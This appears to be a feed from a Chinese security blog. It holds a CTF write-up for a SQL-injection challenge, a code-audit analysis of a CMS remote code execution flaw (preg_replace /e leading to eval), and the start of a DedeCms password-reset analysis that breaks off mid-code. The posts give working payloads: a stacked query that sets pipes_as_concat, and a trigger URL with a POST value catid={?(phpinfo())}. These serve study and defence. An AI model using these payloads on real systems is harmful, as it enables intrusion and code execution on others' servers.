title="easy_sql"></a>easy_sql</h1><p>源码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    include_once &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">    $post = array();</span><br><span class="line">    $get = array();</span><br><span class="line">    global $MysqlLink;</span><br><span class="line"></span><br><span class="line">    //GetPara();</span><br><span class="line">    $MysqlLink = mysqli_connect(&quot;localhost&quot;,$datauser,$datapass);</span><br><span class="line">    if(!$MysqlLink)&#123;</span><br><span class="line">        die(&quot;Mysql Connect Error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $selectDB = mysqli_select_db($MysqlLink,$dataName);</span><br><span class="line">    if(!$selectDB)&#123;</span><br><span class="line">        die(&quot;Choose Database Error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    foreach ($_POST as $k=&gt;$v)&#123;</span><br><span class="line">        if(!empty($v)&amp;&amp;is_string($v))&#123;</span><br><span class="line">            $post[$k] = trim(addslashes($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    foreach ($_GET as $k=&gt;$v)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //die();</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/a&gt;</span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;query&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    if(isset($post[&apos;query&apos;]))&#123;</span><br><span class="line">        $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;</span><br><span class="line">        //var_dump(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&apos;query&apos;]));</span><br><span class="line">        if(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&apos;query&apos;]))&#123;</span><br><span class="line">            //echo $post[&apos;query&apos;];</span><br><span class="line">            die(&quot;Nonono.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if(strlen($post[&apos;query&apos;])&gt;40)&#123;</span><br><span class="line">            die(&quot;Too long.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql = &quot;select &quot;.$post[&apos;query&apos;].&quot;||flag from Flag&quot;;</span><br><span class="line">        mysqli_multi_query($MysqlLink,$sql);</span><br><span class="line">        do&#123;</span><br><span class="line">            if($res = mysqli_store_result($MysqlLink))&#123;</span><br><span class="line">                while($row = mysqli_fetch_row($res))&#123;</span><br><span class="line">                    print_r($row);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;while(@mysqli_next_result($MysqlLink));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure><p>主要的源码在这里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strlen($post[<span class="string">'query'</span>])&gt;<span class="number">40</span>)&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">"Too long."</span>);</span><br><span class="line">       &#125;</span><br><span class="line">$sql = <span class="string">"select "</span>.$post[<span class="string">'query'</span>].<span class="string">"||flag from Flag"</span>;</span><br></pre></td></tr></table></figure><p>看样子应该是堆叠了，但是一直不知道 || 应该怎么用，后来看到这么一篇文章</p><p><a href="https://blog.csdn.net/lixora/article/details/60572357" target="_blank" rel="noopener">https://blog.csdn.net/lixora/article/details/60572357</a></p><p>首先设置sql_mode模式为pipes_as_concat，然后来拼接语句，本地实验了一下</p><p><img src="https://i.loli.net/2019/08/19/a675ZHfQ2nM1SOi.png" alt=""></p><p>自然的题目中对应的$post[‘query’]就是这个</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="builtin-name">set</span> <span class="attribute">sql_mode</span>=pipes_as_concat;select 1</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/19/rTP7iIA3UYENfR9.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CheckIn&quot;&gt;&lt;a href=&quot;#CheckIn&quot; class=&quot;headerlink&quot; title=&quot;CheckIn&quot;&gt;&lt;/a&gt;CheckIn&lt;/h1&gt;&lt;p&gt;题目是一个上传页面，中间件是nginx，尝试上传正常的图片返回如下结果&lt;/p&gt;
&lt;p&gt;&lt;img sr
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://yml-sec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>某cms5-5代码执行分析</title>
    <link href="https://yml-sec.top/2019/08/13/%E6%9F%90cms5-5%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/"/>
    <id>https://yml-sec.top/2019/08/13/%E6%9F%90cms5-5%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/</id>
    <published>2019-08-13T06:00:16.000Z</published>
    <updated>2019-08-13T09:24:30.119Z</updated>
    
    <content type="html"><![CDATA[<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>该处漏洞主要是<strong>preg_replace</strong> 函数/e模式下存在的代码执行问题，虽然该程序版本较老，但该问题在其他程序中仍时有存在</p><p>漏洞触发点在 lib/tool/form.php文件中，关键代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getform</span><span class="params">($name,$form,$field,$data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (get(<span class="string">'table'</span>) &amp;&amp;<span class="keyword">isset</span>(setting::$var[get(<span class="string">'table'</span>)][$name]))</span><br><span class="line">            $form[$name]=setting::$var[get(<span class="string">'table'</span>)][$name];</span><br><span class="line">        <span class="keyword">if</span> (get(<span class="string">'form'</span>) &amp;&amp;<span class="keyword">isset</span>(setting::$var[get(<span class="string">'form'</span>)][$name]))</span><br><span class="line">            $form[$name]=setting::$var[get(<span class="string">'form'</span>)][$name];</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($form[$name][<span class="string">'default'</span>]))</span><br><span class="line">            $form[$name][<span class="string">'default'</span>]=preg_replace(<span class="string">'/\&#123;\?([^&#125;]+)\&#125;/e'</span>,<span class="string">"eval('return $1;')"</span>,$form[$name][<span class="string">'default'</span>]);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[$name]) &amp;&amp;<span class="keyword">isset</span>($form[$name][<span class="string">'default'</span>]))</span><br><span class="line">            $data[$name]=@$form[$name][<span class="string">'default'</span>];</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/templat/'</span>,$name) &amp;&amp;<span class="keyword">empty</span>($data[$name]))</span><br><span class="line">            $data[$name]=@$form[$name][<span class="string">'default'</span>];</span><br><span class="line">        <span class="keyword">if</span> (@$form[$name][<span class="string">'filetype'</span>] == <span class="string">'image'</span>) &#123;</span><br><span class="line">            $return=form::upload_image($name,front::post($name) ?front::post($name) : @$data[$name]);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>关键点在于这句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($form[$name][<span class="string">'default'</span>]))</span><br><span class="line">            $form[$name][<span class="string">'default'</span>]=preg_replace(<span class="string">'/\&#123;\?([^&#125;]+)\&#125;/e'</span>,<span class="string">"eval('return $1;')"</span>,$form[$name][<span class="string">'default'</span>]);</span><br></pre></td></tr></table></figure><p>当if条件成立时，就会引发代码执行问题</p><p>下面寻找触发getform函数的代码</p><p><img src="https://i.loli.net/2019/08/13/nsBuUXdalyfo3Sg.png" alt=""></p><p>可以看到该函数存在六处调用，尝试跟进第一处</p><p>代码位于 cache/template/default/manage/#guestadd.php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> form::getform(<span class="string">'catid'</span>,$form,$field,$data);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>该段直接调用了静态方法getform，但目前并不知道 catid是什么，尝试全局搜索</p><p>在/lib/table/archive.php中找到了catid 相关的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_form</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'catid'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'selecttype'</span>=&gt;<span class="string">'select'</span>,</span><br><span class="line">                        <span class="string">'select'</span>=&gt;form::arraytoselect(category::option(<span class="number">0</span>,<span class="string">'tolast'</span>)),</span><br><span class="line">                        <span class="string">'default'</span>=&gt;get(<span class="string">'catid'</span>),</span><br><span class="line">                        <span class="string">'regex'</span>=&gt;<span class="string">'/\d+/'</span>,</span><br><span class="line">                        <span class="string">'filter'</span>=&gt;<span class="string">'is_numeric'</span>,</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'typeid'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'selecttype'</span>=&gt;<span class="string">'select'</span>,</span><br><span class="line">                        <span class="string">'select'</span>=&gt;form::arraytoselect(type::option(<span class="number">0</span>,<span class="string">'tolast'</span>)),</span><br><span class="line">                        <span class="string">'default'</span>=&gt;get(<span class="string">'typeid'</span>),</span><br><span class="line">                        <span class="string">'regex'</span>=&gt;<span class="string">'/\d+/'</span>,</span><br><span class="line">                        <span class="string">'filter'</span>=&gt;<span class="string">'is_numeric'</span>,</span><br><span class="line">                ),</span><br><span class="line"><span class="string">'toppost'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'selecttype'</span>=&gt;<span class="string">'select'</span>,</span><br><span class="line">                        <span class="string">'select'</span>=&gt;form::arraytoselect(<span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">'不置顶'</span>,<span class="number">2</span>=&gt;<span class="string">'栏目置顶'</span>,<span class="number">3</span>=&gt;<span class="string">'全站置顶'</span>)),</span><br><span class="line">                        <span class="string">'default'</span>=&gt;<span class="number">0</span>,</span><br><span class="line">                        <span class="string">'regex'</span>=&gt;<span class="string">'/\d+/'</span>,</span><br><span class="line">                        <span class="string">'filter'</span>=&gt;<span class="string">'is_numeric'</span>,</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'ishtml'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'selecttype'</span>=&gt;<span class="string">'radio'</span>,</span><br><span class="line">                        <span class="string">'select'</span>=&gt;form::arraytoselect(<span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">'继承'</span>,<span class="number">1</span>=&gt;<span class="string">'生成'</span>,<span class="number">2</span>=&gt;<span class="string">'不生成'</span>)),</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'checked'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'selecttype'</span>=&gt;<span class="string">'radio'</span>,</span><br><span class="line">                        <span class="string">'select'</span>=&gt;form::arraytoselect(form::yesornotoarray(<span class="string">'审核'</span>)),</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'image'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'filetype'</span>=&gt;<span class="string">'image'</span>,</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'thumb'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'filetype'</span>=&gt;<span class="string">'thumb'</span>,</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'displaypos'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'selecttype'</span>=&gt;<span class="string">'checkbox'</span>,</span><br><span class="line">                        <span class="comment">//'select'=&gt;form::arraytoselect(array(1=&gt;'首页推荐',2=&gt;'首页焦点',3=&gt;'首页头条',4=&gt;'列表页推荐',5=&gt;'内容页推荐')),</span></span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'htmlrule'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="comment">//'tips'=&gt;" 默认：&#123;?category::gethtmlrule(get('id'),'showhtmlrule')&#125;",</span></span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'template'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'selecttype'</span>=&gt;<span class="string">'select'</span>,</span><br><span class="line">                        <span class="string">'select'</span>=&gt;form::arraytoselect(front::$view-&gt;archive_tpl_list(<span class="string">'archive/show'</span>)),</span><br><span class="line">                        <span class="comment">//'tips'=&gt;" 默认：&#123;?category::gettemplate(get('id'),'showtemplate')&#125;",</span></span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'showform'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'selecttype'</span>=&gt;<span class="string">'select'</span>,</span><br><span class="line">                        <span class="string">'select'</span>=&gt;form::arraytoselect(get_my_tables_list()),</span><br><span class="line">                        <span class="string">'default'</span>=&gt;<span class="string">"0"</span>,</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'introduce_len'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'default'</span>=&gt;config::get(<span class="string">'archive_introducelen'</span>)</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'attr1'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'selecttype'</span>=&gt;<span class="string">'checkbox'</span>,</span><br><span class="line">                        <span class="string">'select'</span>=&gt;form::arraytoselect(<span class="keyword">$this</span>-&gt;getattrs(<span class="number">1</span>)),</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'grade'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'selecttype'</span>=&gt;<span class="string">'radio'</span>,</span><br><span class="line">                        <span class="string">'select'</span>=&gt;form::arraytoselect(<span class="keyword">array</span>(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)),</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'pics'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'filetype'</span>=&gt;<span class="string">'image2'</span>,</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'author'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'tips'</span>=&gt;<span class="string">' '</span>,</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'attr3'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'tips'</span>=&gt;<span class="string">' '</span>,</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'htmlrule'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'selecttype'</span>=&gt;<span class="string">'select'</span>,</span><br><span class="line">                        <span class="string">'select'</span>=&gt;form::arraytoselect(getHtmlRule(<span class="string">'archive'</span>)),</span><br><span class="line">                        <span class="string">'default'</span>=&gt;<span class="string">''</span>,</span><br><span class="line">                ),</span><br><span class="line">        <span class="string">'tag_option'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'selecttype'</span>=&gt;<span class="string">'select'</span>,</span><br><span class="line">        <span class="string">'select'</span>=&gt;form::arraytoselect(tag::getTags()),</span><br><span class="line">        ),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>注意到这一句</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'default'</span>=&gt;<span class="keyword">get</span>(<span class="string">'catid'</span>),</span><br></pre></td></tr></table></figure><p>跟进get函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($var)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (front::get($var))</span><br><span class="line">        <span class="keyword">return</span> front::get($var);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (front::post($var))</span><br><span class="line">        <span class="keyword">return</span> front::post($var);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (config::get($var))</span><br><span class="line">        <span class="keyword">return</span> config::get($var);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (session::get($var))</span><br><span class="line">        <span class="keyword">return</span> session::get($var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($var)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">self</span>::$get[$var]))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">self</span>::$get[$var];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">post</span><span class="params">($var)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">self</span>::$post[$var]))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">self</span>::$post[$var];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>最后跟进到front类中__construct()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//关键语句</span></span><br><span class="line"><span class="keyword">self</span>::$get=$_GET;</span><br><span class="line"><span class="keyword">self</span>::$post=$_POST;</span><br></pre></td></tr></table></figure><p>这就说明catid和defult的值都是我们可以控制的，这样我们就可以通过控制$form[$name(catid)] [‘default’]来达到执行任意代码的目的</p><p>此时我们需要寻找一个触发get_form()函数的地方，并且再触发该函数后需要引用guestadd.php页面以此衔接我们的利用操作，全局搜索后定位在 /lib/default/manage_act.php ，该文件在第29行对get_form()函数进行了调用</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="function"><span class="title">this</span>-&gt;</span><span class="function"><span class="title">view</span>-&gt;</span><span class="function"><span class="title">form</span>=$this-&gt;</span>_<span class="function"><span class="title">table</span>-&gt;</span>get_form();</span><br></pre></td></tr></table></figure><p>同时在/lib/tool/front_class.php 文件的front类中存在这样的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (@$_GET[<span class="string">'g'</span>] &amp;&amp;is_numeric(@$_GET[<span class="string">'g'</span>])) &#123;    </span><br><span class="line">header(<span class="string">'location: ?case=manage&amp;act=guestadd&amp;manage=archive&amp;guest=1'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该文件是网站入口文件index.php所引用的，所以我们访问如下url即可触发</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//localhost/?g=1</span></span><br></pre></td></tr></table></figure><p>接着会被重定向为这样：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/<span class="meta">index</span>.php?case=manage<span class="variable">&amp;act</span>=guestadd<span class="variable">&amp;manage</span>=archive<span class="variable">&amp;guest</span>=1</span><br></pre></td></tr></table></figure><p>这时只要post过去符合正则匹配的代码就可以了</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">'/\&#123;\?([^&#125;]+)\&#125;/e'</span><br><span class="line"><span class="comment">//该段正则表达式即为匹配&#123;?任意内容&#125;,当post如下语句时就会触发执行</span></span><br><span class="line"><span class="comment">//catid=&#123;?(phpinfo())&#125;</span></span><br></pre></td></tr></table></figure><p>梳理一下利用过程：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">index.php-&gt;</span><br><span class="line">(<span class="regexp">/lib/tool</span><span class="regexp">/front_class.php)-&gt;</span></span><br><span class="line"><span class="regexp">(/lib</span><span class="regexp">/default/manage</span>_act.php)[-&gt;get_form()]-&gt;</span><br><span class="line">(cache/template/default/manage/<span class="comment">#guestadd.php)[-&gt;getform('catid'...)]-&gt;</span></span><br><span class="line">(<span class="class"><span class="keyword">lib</span>/<span class="title">tool</span>/<span class="title">form</span>.<span class="title">php</span>)[<span class="title">preg_reolace</span>()]//<span class="title">RCE</span></span></span><br></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>当我们传入{?(phpinfo())}时，函数会变成这样</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace('/\&#123;\?([^&#125;]+)\&#125;/e',<span class="string">"eval('return $1;')"</span>,<span class="string">"&#123;?(phpinfo())&#125;"</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>匹配成功后会执行eval(‘return $1;’)</p><p>而(phpinfo())在正常情况下同样会执行</p><p><img src="https://i.loli.net/2019/08/13/moqT8OQ3nCGEVKA.png" alt=""></p><p>执行成功会返回true这样前面的eval(‘return $1;’)就相当于eval(‘return phpinfo();’)，所以出现了代码执行</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;源码分析&quot;&gt;&lt;a href=&quot;#源码分析&quot; class=&quot;headerlink&quot; title=&quot;源码分析&quot;&gt;&lt;/a&gt;源码分析&lt;/h1&gt;&lt;p&gt;该处漏洞主要是&lt;strong&gt;preg_replace&lt;/strong&gt; 函数/e模式下存在的代码执行问题，虽然该程序版本较
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="https://yml-sec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>DedeCms5-7任意用户密码重置分析</title>
    <link href="https://yml-sec.top/2019/08/06/DedeCms5-7%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E5%88%86%E6%9E%90/"/>
    <id>https://yml-sec.top/2019/08/06/DedeCms5-7%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E5%88%86%E6%9E%90/</id>
    <published>2019-08-06T02:53:47.000Z</published>
    <updated>2019-08-11T02:02:58.397Z</updated>
    
    <content type="html"><![CDATA[<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p>漏洞利用点主要是php弱类型的判断缺陷，漏洞代码位于 member\resetpassword.php</p><p>主要代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($dopost == <span class="string">"safequestion"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $mid = preg_replace(<span class="string">"#[^0-9]#"</span>, <span class="string">""</span>, $id);</span><br><span class="line">    $sql = <span class="string">"SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = '$mid'"</span>;</span><br><span class="line">    $row = $db-&gt;GetOne($sql);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($safequestion)) $safequestion = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span 